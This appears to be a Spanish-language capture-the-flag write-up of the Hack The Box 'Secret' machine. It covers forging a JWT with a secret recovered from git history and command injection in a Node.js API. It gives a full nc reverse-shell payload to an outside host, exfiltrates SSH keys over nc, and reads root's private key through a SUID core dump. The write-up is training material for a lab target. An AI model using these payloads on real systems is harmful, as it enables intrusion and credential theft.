#  SECRET MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/1.png)

## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 -v -n 10.10.11.120 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p22,80,3000 -sV -sC 10.10.11.120 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/3.png)

## EXPLICACION DEL VECTOR DE EXPLOTACION

Si vamos a la pagina web, vemos que es una aplicacion (el puerto 3000 parece ser una copia de la pagina y al parecer es una pagina creada en Nodejs ) y nos permite descargar el codigo fuente de esa aplicacion, asi que descarguemosla, al descomprimir este es el contenido:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/4.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/5.png)

es una aplicacion en **Nodejs** conocer este lenguaje seria un plus y por suerte lo conozco. Mas adelante les explicare algo del codigo. Si vamos indagando en la pagina y vamos a la parte de **register user**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/6.png)

al parecer es una API con la que se puede interactuar:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/7.png)

vamos bajando y vemos que se tiene autenticacion con JWT:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/8.png)

ademas existe una ruta de la API que pasandole el token JWT verifica si eres admin o no.

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/9.png)

muy bien sabemos con funciona la API pero si conoces y entiendes el lenguaje es un plus porque sabrias estas cosas:

----------------------------------------

**Cuando configuras JWT en Nodejs el TOKEN_SECRET con el que firmas el token normalmente se coloca en .env**

ahi tambien van las configuracion globales como acceso a base de datos, al ver el contenido de ese archivo vemos el **TOKEN_SECRET** pero es muy sencillo, habria que validar si es el correcto. 

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/10.png)

---------------------------------------

Puedes configurar un prefijo para unas determinadas rutas, es decir puedes definir para unas consultas a latabla usuarios que se use **/api/user**. De tal manera que se tiene que usar eso y cambiar el verbo de la peticion para unas operaciones de tipo CRUD por ejemplo:

- /api/user - GET
- /api/user - POST
- /api/user/:id - PUT
- /api/user/:id - DELETE

eso se puede definir en vearios lugares de un proyecto en Nodejs pero esta en **index.js**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/11.png)

para esa ruta privada que verifica si eres admin o no debes usar **/api/** pero para el registro y el login **/api/user**.

-----------------------------------------

en la carpeta **routes** es donde se define los endpoints del API, lo mas interesante es.

en **/routes/auth.js** se ve que utiliza ese TOKEN_SECRET para firmar el token:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/12.png)

en **/routes/priv.js** la ruta **/priv** utiliza un **middlewaer** para validar la firma del token:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/13.png)

si vemos el archivo **/routes/verifytoken.js** que es el middleware, vemos que obtiene la informacion del token del header **auth-token** y lo pasa como parametro "user" en la request (req.user):

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/14.png)

volviendo a la ruta /priv se realiza la verificacion del campo "name" de la informacion del token y si es igual a **theadmin** eres administrar sino no:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/15.png)

mas abajo vemos otra ruta llamada **/logs**, esta ruta igual realiza la verificacion del token y si tu nombre es **theadmin** ejecuta un comando a nivel de sistema pasando como parametro algo que podemos enviar en la url:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/16.png)

el parametro file que se concatena con un comando que se ejecuta a nivel de sistema con **exec()** se lo obtiene de la url ya que en el codigo aparece con.

```js
const file = req.query.file;
```

es decir que lo podemos enviar asi: **/..../logs?file=loquequeramos**

como se esta haciendo una concatenacion del valor con el comando a ejecutar esto es vulnerable a **command injection**.

Ya que tenemos un contexto mejor de la vulnerabilidad repasemos que tenemos que hacer:

- registrarse
- loguearse y obtener el token
- ver la forma de editar el name del token JWT con el TOKEN_SECRET
- realizar la injeccion de comandos

MANOS A LA OBRA!!!

## EXPLOTACION

la documentacion nos muestra como podemos registrarnos e iniciar sesion, lo haremos con **curl**:

(para mayor facilidad a la hora de hacer la peticiones agregue el secret.htb en el /etc/hosts)

registro:

```bash
curl -X POST -H "Content-Type: application/json" -v http://secret.htb/api/user/register --data '{"name":"kriko69","email":"kriko69@htb.com","password":"kriko69"}'
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/17.png)

respuesta esperada como la API mencionaba.

login:

```bash
curl -X POST -H "Content-Type: application/json" -v http://secret.htb/api/user/login --data '{"email":"kriko69@htb.com","password":"kriko69"}'
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/18.png)

ya tenemos el JWT. Intente editar el token con el valor de secret del .env pero no funciono asi que significa que el TOKEN_SECRET no es el correcto. Algo que note en el codigo funte que descargamos es que contiene el **.git** eso quiere decir que es como clonar de un repositoro de github, por lo que puede tener commit pasamos y en alguno tener el **TOKEN_SECRET** correcto. 

para ver todos los commits de ese projecto podemos usar el siguiente comando:

```bash
git log
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/19.png)

vemos muchos commits y cada uno tiene un identificador, mas abajo vemos el primer commit por la descripcion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/20.png)

podemos movernos a ese commit pasandole su identificador:

```bash
git checkout 55fe756a29268f9b4e786ae468952ca4a8df1bd8
```

ahora si vemos el contenido de **.env**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/21.png)

vemos otro valor en **TOKEN_SECRET**.

Existe una herramienta que automatiza este proceso y extrae las versiones del codigo diferentes de cada commit, de esta manera puedes ver el contenido del archivo **.env** a traves de los commits. La herramienta es [GitTools](https://github.com/internetwache/GitTools):

```bash
./extractor.sh /local-web /dump
```

- /local-web es la carpeta con el codigo que descargamos.
- /dump es la carpeta donde queremos guardar la informacion que extraiga.

nos extrae toda la informacion de los commits:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/22.png)

ahora podemos automatizar para ver el contenido de **.env** en cada commit:

```bash
for i in $(ls .); do cat $i/.env;done
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/23.png)

ya tenemos el **TOKEN_SECRET** correcto, ahora vemos a editar el JWT que tenemos para hacernos pasar por admin. Para ello usare la herramienta [jwt_tool](https://github.com/ticarpi/jwt_tool), esta herramienta permite decodificar tokens, editar sus valores, realizar comprobaciones, fuerza bruta para hallar el secret y mas recomiendo leer la documentacion.

si le pasamos el token que obtuvimos en el login nos muestra la informacion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/24.png)

vemos la informacion que contiene y el algoritmo que usa.

para editar un token y que sea legitimo para la aplicacion necesito firmarlo con el **TOKEN_SECRET** que ya lo tenemos asi que hagamoslo:

```bash
python3 jwt_tool.py -I -S "hs256" -pc "name" -pv "theadmin" -p "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE" eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWI0MDY3N2QwYjdmMzA0NjFlMmI5NTkiLCJuYW1lIjoia3Jpa282OSIsImVtYWlsIjoia3Jpa282OUBodGIuY29tIiwiaWF0IjoxNjM5MTg4MTYwfQ.08SR9ExrW2Hk-m7DInB5XA8IRtth--WfM4udSjHPW-k
```

- -I: especificamos que vamos a insertar nueva data o modificar la existente.
- -S: especificamos el algoritmo que usara para el nuevo token modificado. (usaremosel mismo)
- -pc: nombre del campo de la data que queremos modificar.
- -pv: nuevo valor para ese campo
- -p: especificamos el **TOKEN_SECRET**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/25.png)

NOTA: con el parametro -T podemos agregar o eliminar data.

si comprobamos la data de ese token:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/26.png)

el valor de nombre ya esta modificado.

ahora mandemos a la ruta **/priv** para ver si somo admin:

```bash
curl 'http://secret.htb/api/priv' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWI0MDY3N2QwYjdmMzA0NjFlMmI5NTkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImtyaWtvNjlAaHRiLmNvbSIsImlhdCI6MTYzOTE4ODE2MH0.iAXcuzsLrFbgTPtiAFUre5CpMEtCMchnItzbViAF-Yw'
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/27.png)

logramos modificar el token JWT exitosamente y poder parecer admin, lo que significa que podemos probar el command injection, debemos enviar el payload en **/logs?file=PAYLOAD** y ese payload se concatena en este comando:

```bash
git log --oneline ${file}
```

para ver si funciona pondre este payload, no olviden mandar el token:

```bash
;id
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/28.png)

funciono tenemos RCE.

por lo que yo colocare una reverse shell en bash, anteponiendo un ";" para especificar otro comando (esta funciono es mi caso):

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4242 >/tmp/f
```

pero ya que va por la url y los espacios y caracteres especiales suelen dar problemas lo voy a encodear en URL:

```bash
%3Brm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.5%204242%20%3E%2Ftmp%2Ff
```

nos colocamos a la escucha y temeos una conexion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/29.png)

hagaos un tratamiento de la tty:

```bash
script /dev/null -c bash
ctrl Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

tenemos una shell mas util y podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/30.png)

## CREAR PERSISTENCIA SSH

vimos que el servicio de ssh estaba abierto en la maquina por lo que podemos crearnos un par de claves.

```bash
cd /home/dasith
mkdir .ssh
ssh-keygen
cat id_rsa.pub
echo "copy id_rsa.pub output" > authorized_keys
```

nos pasamos el id_rsa a la maquina kali:

KALI:

```bash
nc -lvnp 4545 > id_rsa
```

VICTIMA:

```bash
nc 10.10.14.5 4545 < id_rsa
```

usamos el id_rs para conectarnos

```bash
chmod 600 id_rsa
ssh -i id_rsa dasith@10.10.11.120
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/31.png)

## ELEVACION DE PRIVILEGIOS

nos vamos a la raiz y buscamos permisos SUID

```bash
cd

find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

vemos algo en **/opt** que llama la atencion

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/32.png)

vamos a la ruta y vemos el binario SUID y al parecer el codigo del binario:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/33.png)

veamos que pasa si ejecutamos el binario:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/34.png)

vemos que es un binario para linux de 64 bits. (ELF x64) y al ejecutarlo nos pide la ruta de un archivo, yo le coloque la de la flag de root y muestra la cantidad de lineas, palabras y caracteres. Al ser SUID puede leer ese archivo. Pero no dice nada mas.

veamos el codigo del binario:

```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}


```

Es un codigo bastante extenso y normalmente toma tiempo entender lo que hace y como lo hace pero se puede ver que tiene una funcion para contar un archivo. Lo mas interesante es en la funcion **main()** que en un programa es la funcion principal y donde normalemnte se invoca todo. Antes de mostrar el mensaje de "guardar los resultados" se ve 2 comentarios:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/35.png)

se setea una variable **PR_SET_DUMPLEABLE** en 1 usando **prctl**, el comentario dice que habilita la generacion coredump, buscando que es esto di con la siguiente informacion:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/36.png)

Fuente: [https://man7.org/linux/man-pages/man2/prctl.2.html](https://man7.org/linux/man-pages/man2/prctl.2.html)

Ahora se que se puede dumpear la informacion de ese proceso porque el valor seteado, pero como?

Averiguando un poco di con esta informacion [https://wiki.ubuntu.com/CrashReporting](https://wiki.ubuntu.com/CrashReporting)

al ejecutar un programa, toda la informacion que le colocamos (mediante inputs) lo toma del `buffer` y lo coloca en `/var/crash`,  cuando el programa falla el coredump (la informacion) se cuargara tambien en `/var/crash`. Al tener el valor **PR_SET_DUMPEABLE** es posible dumpear la informacion del buffer en el momento que el binario se ejecuto y le introducimos ciertos valores.

Ahora sabemos que el binario tiene permisos para leer informacion privilegiada, podriamos introducir el archivo que queramos leer, pausar el programa (Ctrl+Z), matar el proceso del programa (kill) para que cuando queramos volver al programa (fg) falle y se guarde la informacion y luego dumpearla.

Hagamos eso, en este caso veamos si funciona y podemos obtener la flag de root (**/root/root.txt**)

```bash
./count #ejecutamos el binario
/root/root.txt #le indicamos el archivo que queremos leer
Ctrl+Z #pausamos el proceso
ps #vemos los procesos que se estan ejecutando para obtener el PID del binario
kill -SEGV PID # matamos el proceso del binario
fg #regresamos a la ejecucion del binario

```

Esto fallara y ya se explico el por que, vemos el mensaje del **core dumped**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/37.png)

recordemos que esto se guarda en **/var/crash**, veamos que hay ahi:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/38.png)

se creo un archivo y nos podemos dar cuenta por la fecha y el propietario. Ahora ese archivo nos importa el `coredump` ahi esta la informacion del archivo que le pasamos al binario, podemos separar el coredump en un archivo aparte  para  ello usaremos una herramienta propia de linux llamada `apport-unpack`:

```bash
apport-unpack _opt_count.1000.crash /tmp/files
```

donde **/tmp/files** es la salida (donde esta el coredump)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/39.png)

ese archivo es un ELF de 64 bits, podemos ver las cadenas mas significativas y ver si hay informacion:

```bash
strings Coredump
```

vemos el contenido de **/root/root.txt** que fue lo que pasamos al ejecutar el binario **count**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/40.png)

### OBTENER SHELL COMO ROOT

para obtener una reverse shell como root debemos repetir el proceso de elevacion de privilegios pero en el binario colocar la ruta de la id_rsa de root:

```bash
/root/.ssh/id_rsa
```

al dumpear la informacion veremos el contenido:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/41.png)

nos lo pasamos a la maquina kali y nos conectamos por SSH, no sera necesario colocar contraseña:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/SECRET/images/42.png)













